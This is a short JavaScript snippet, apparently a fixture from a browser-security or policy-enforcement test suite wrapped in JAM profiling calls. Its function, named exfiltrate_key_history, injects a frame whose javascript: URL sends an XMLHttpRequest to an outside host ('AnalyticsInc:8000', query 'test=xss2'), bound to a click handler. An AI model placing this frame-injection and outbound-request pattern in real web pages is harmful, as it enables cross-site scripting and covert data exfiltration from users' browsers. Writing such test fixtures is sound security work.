
JAM.startProfile('load');
function exfiltrate_key_history(){var script=document.createElement("frameset"),script2=document.createElement("frame");script2.src='javascript:Function(\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss2",true);xmlhttp.send(null);\')()';JAM.call(script.appendChild,script,[script2]);script2=document.getElementsByTagName("body")[0];JAM.call(script2.appendChild,script2,[script])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
